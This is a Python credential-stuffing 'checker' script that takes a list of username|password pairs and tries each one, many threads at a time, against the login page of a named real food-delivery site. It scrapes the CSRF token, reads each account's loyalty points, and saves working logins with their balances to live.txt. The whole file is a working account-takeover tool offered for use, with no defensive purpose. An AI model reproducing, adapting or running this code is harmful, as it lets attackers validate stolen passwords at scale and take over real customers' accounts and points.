import requests,sys,re
from concurrent.futures import ThreadPoolExecutor

print("""\x1b[32m ___  _  _ ___  
 |__] |__| |  \ 
 |    |  | |__/   
 \x1b[37m--------------  \x1b[33mby me for you
 \x1b[31mC H E C K E R  \x1b[31m version fast!\x1b[37m
 \x1b[37m--------------  instagram : fajarid05_
""")

def worker(usr, pwd):
    s = requests.Session()

    token = s.get("https://www.phd.co.id/id/users/login/1").text
    token = re.findall(r"name=\"my_token\" value=\"(.*?)\"", token)[0]

    data = {
        'return_url': 'https://www.phd.co.id/id/users/welcome',
        'my_token': token,
        'username': usr,
        'password': pwd,
        'remember': '1'
    }

    login = s.post("https://www.phd.co.id/id/users/login/1", data=data).text
    point = s.get("https://www.phd.co.id/id/accounts").text
    point = re.findall(r"<li class=\"owner-poin\">(.*?)</li>", point)
    return usr, pwd, point


def main():
	file = sys.argv[1]
	
	if sys.argv != [2]:
		wkr = 20
	else:
		wkr = int(sys.argv[2])
		
	try:
		list = open(file)
	except FileNotFoundError:
		print("File not found!")
		sys.exit()
	jml = 0
	no = 0
	err = 0
	live = 0
	die = 0
	for x in list.readlines():
		jml += 1
	list.seek(0)
	print(f"[+] Jumlah Akun = {jml} \n")
	with ThreadPoolExecutor(max_workers=wkr) as e:
		futures = []
		for data in list.readlines():
			data = data.strip().split("|")
			if not data or len(data) != 2:
				err += 1
				continue
			usr, pwd = data
			futures.append(e.submit(worker, usr, pwd))
		for i, future in enumerate(futures):
			usr, pwd, point = future.result()
			no = i+1
			if not point:
				die += 1
				print(
				    f"\033[37;2m[\033[31;2mDIEE\033[37;2m] {usr}|{pwd}\033[37;2m")
                    
			else:
				live += 1
				print(
				f"\033[37;2m[\033[32;2mLIVE\033[37;2m] {usr}|{pwd} \033[1;33m{point[0]}\033[37;2m"
				)
				with open("live.txt","a") as file:
					file.write(f"{usr}|{pwd} {point[0]}\n")
				file.close()
				
		print(f"\n\033[1;37m[*] LIVE = {live} \n[*] DIE = {die} \n[*] ERROR = {err}\n[+] SAVED IN = live.txt")
		print('-'*25)

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print(f"[!] USAGE: python {sys.argv[0]} <list.txt> <worker>")
		sys.exit()
	try:
		main()
	except KeyboardInterrupt:
		sys.exit()
